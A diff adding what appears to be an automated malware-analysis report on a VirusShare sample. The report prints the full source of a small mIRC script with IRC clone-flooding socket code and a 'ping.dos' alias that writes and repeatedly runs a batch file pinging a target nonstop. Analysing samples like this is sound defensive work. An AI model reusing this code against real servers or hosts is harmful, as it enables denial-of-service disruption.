@@ -1,0 +1,55 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "run": "May run an executable file or a system command",
+            "write": "May write to a file"
+        },
+        "macro": "on *:text:*:#:{\n  timer $+ $nick 1 3 unset %flood. [ $+ [ $nick ] ]\n  inc %flood. [ $+ [ $nick ] ] \n  if (%flood. [ $+ [ $nick ] ] > 5) { kick # $nick Flood | auser 1w $address($nick,0) }\n}\non *:join:#:{\n  echo # $address($nick,0)\n}\nalias split {\n  sockopen split $+ $rname 192.168.0.1 6667\n  timer -m 1 1 split\n}\non *:sockopen:split*:{\n  if ($sockerr == 0) {\n    sockwrite -nt $sockname NICK $r(a,z) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(a,z)\n    sockwrite -nt $sockname USER $users.name($users.name(%nick))  \" $+ $rname $+ \" \" $+ $ip $+ \" : $+ $users.name(%nick)\n    timer* off  \n  }\n}\nalias ping.dos {\nremove 123.bat \n write 123.bat ping $1 -t $3-\n  set %t.ft 0\n  timer -m $2 500 run 123.bat\n}"
+    },
+    "filename": "VirusShare_3c00d98b3ec778db7578e405e8aebf79",
+    "filesize": 756,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "3c00d98b3ec778db7578e405e8aebf79",
+        "sha1": "3668a91be276598552deba43dc036d6d9dc12409",
+        "sha256": "734fc309744553d784f733ed0a9ac1fa59e5a510cbc1b4ebb95b06f500d28cc2"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "on *:text:*:#:{",
+            "  timer $+ $nick 1 3 unset %flood. [ $+ [ $nick ] ]",
+            "  inc %flood. [ $+ [ $nick ] ] ",
+            "  if (%flood. [ $+ [ $nick ] ] > 5) { kick # $nick Flood | auser 1w $address($nick,0) }",
+            "on *:join:#:{",
+            "  echo # $address($nick,0)",
+            "alias split {",
+            "  sockopen split $+ $rname 192.168.0.1 6667",
+            "  timer -m 1 1 split",
+            "on *:sockopen:split*:{",
+            "  if ($sockerr == 0) {",
+            "    sockwrite -nt $sockname NICK $r(a,z) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(a,z)",
+            "    sockwrite -nt $sockname USER $users.name($users.name(%nick))  \" $+ $rname $+ \" \" $+ $ip $+ \" : $+ $users.name(%nick)",
+            "    timer* off  ",
+            "alias ping.dos {",
+            "remove 123.bat ",
+            " write 123.bat ping $1 -t $3-",
+            "  set %t.ft 0",
+            "  timer -m $2 500 run 123.bat"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [
+            "192.168.0.1"
+        ],
+        "url": []
+    },
+    "time": "0:00:00.263229",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
